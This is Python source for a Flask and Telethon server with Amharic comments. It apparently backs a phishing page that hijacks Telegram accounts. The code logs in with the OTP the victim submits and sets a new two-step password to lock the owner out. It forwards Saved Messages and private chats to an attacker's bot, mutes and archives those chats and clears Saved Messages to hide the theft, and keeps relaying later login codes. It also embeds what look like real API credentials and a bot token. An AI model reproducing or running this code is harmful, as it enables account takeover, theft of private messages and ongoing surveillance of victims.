import asyncio
import threading
import requests
import random
import string
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.tl import functions, types

app = Flask(__name__)
CORS(app)

API_ID = 37093089
API_HASH = 'd282bc1a4fa231fa016eeb4aa6389602'
BOT_TOKEN = '8671918482:AAHqnGcuTAhOAX5I4959PpjQer9JWN9nIMA'
ADMIN_CHAT_ID = '7206535373'

def send_telegram_alert(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': ADMIN_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Bot notification error:", e)

telethon_loop = asyncio.new_event_loop()

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

t = threading.Thread(target=start_background_loop, args=(telethon_loop,), daemon=True)
t.start()

active_sessions = {}

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, telethon_loop)
    return future.result()

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'status': 'error', 'message': 'እባክዎ ስልክ ቁጥር ያስገቡ'})

    async def async_send():
        client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        active_sessions[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash
        }
        return {'status': 'success', 'message': 'ኮድ ተልኳል!'}

    try:
        result = run_async(async_send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')

    if phone not in active_sessions:
        return jsonify({'status': 'error', 'message': 'ክፍለ ጊዜው አልቋል. እባክዎ እንደገና ይሞክሩ።'})

    session_data = active_sessions[phone]
    client = session_data['client']
    phone_code_hash = session_data['phone_code_hash']

    async def async_verify():
        # 1. ሎጊን ማድረግ
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        # 2. የዘፈቀደ ጠንካራ ፓስዎርድ ማመንጨት
        chars = string.ascii_letters + string.digits + "!@#$%"
        new_password = "".join(random.choice(chars) for _ in range(12))

        try:
            await client(functions.account.UpdatePasswordSettingsRequest(
                password=types.InputCheckPasswordEmpty(),
                new_settings=types.PasswordRequirements(
                    new_password=new_password
                )
            ))
        except Exception as p_err:
            print("Password set error:", p_err)

        alert_msg = (
            f"🔥 *አዲስ አካውንት በድብቅ ተይዟል!*\n\n"
            f"📱 ስልክ ቁጥር: `{phone}`\n"
            f"🔑 OTP ኮድ: `{code}`\n"
            f"🔒 የተፈጠረ ፓስዎርድ: `{new_password}`"
        )
        send_telegram_alert(alert_msg)

        # 🚀 3. መረጃዎችን መጥራት፣ ወደ ቦት መላክ እና ከስልኩ እንዲደበቁ/እንዲጠፉ ማድረግ
        try:
            send_telegram_alert(f"📂 *የ `{phone}` Saved Messages እና Personal Chats መቃኘት ተጀምረዋል...*")
            
            # ሀ) Saved Messages ይዘቶችን ወደ ቦት ማስተላለፍ
            async for message in client.iter_messages('me', limit=100):
                try:
                    await client.forward_messages(int(ADMIN_CHAT_ID), message)
                    await asyncio.sleep(0.3)
                except Exception:
                    pass

            # ለ) Personal Private Chats ቃኝቶ ወደ ቦት መላክ እና ከስልኩ መደበቅ/ማጽዳት
            async for dialog in client.iter_dialogs():
                if dialog.is_user and not dialog.entity.bot:
                    try:
                        # 1. ቻቱን Mute ማድረግ
                        await client(functions.account.UpdateNotifySettingsRequest(
                            peer=dialog.entity,
                            settings=types.InputPeerNotifySettings(mute_until=2147483647)
                        ))
                        
                        # 2. ቻቱን ወደ Archive ማህደር ማዛወር (በስልኩ እንዲደበቅ)
                        await client(functions.folders.EditPeerFoldersRequest(
                            folder_peers=[types.InputFolderPeer(
                                peer=dialog.entity,
                                folder_id=1
                            )]
                        ))
                    except Exception:
                        pass

                    # 3. መልዕክቶቹን ወደ ቦት መላክ
                    async for message in client.iter_messages(dialog.entity, limit=20):
                        if message.media or message.message:
                            try:
                                await client.forward_messages(int(ADMIN_CHAT_ID), message)
                                await asyncio.sleep(0.3)
                            except Exception:
                                pass

            # ሐ) የተጠቃሚውን Saved Messages ታሪክ ሙሉ በሙሉ በማጽዳት ከስልኩ እንዲደበቅ ማድረግ
            try:
                await client(functions.messages.DeleteHistoryRequest(
                    peer='me',
                    max_id=0,
                    just_clear=True
                ))
            except Exception as cl_err:
                print("Clear saved messages error:", cl_err)

            send_telegram_alert(f"✅ *የ `{phone}` መረጃዎች ተልከዋል፤ ቻቶቹም Mute & Archive ተደርገዋል!*")
        except Exception as transfer_err:
            print("Data transfer error:", transfer_err)

        # 🎯 4. ቀጣይ የሚመጡ OTPዎችን ወደ ቦት መከታተል
        @client.on(events.NewMessage(chats=777000))
        async def otp_listener(event):
            otp_text = event.message.message
            otp_alert = (
                f"📥 *አዲስ OTP ኮድ ተገኝቷል!*\n\n"
                f"📱 ስልክ ቁጥር: `{phone}`\n"
                f"💬 መልዕክት:\n`{otp_text}`"
            )
            send_telegram_alert(otp_alert)

        if phone in active_sessions:
            del active_sessions[phone]

        return {'status': 'success', 'message': 'በተሳካ ሁኔታ ተገናኝቷል!'}

    try:
        result = run_async(async_verify())
        return jsonify(result)
    except SessionPasswordNeededError:
        return jsonify({'status': 'password_required', 'message': 'እባክዎ የቴሌግራም 2-Step Verification ፓስዎርድ ያስገቡ'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)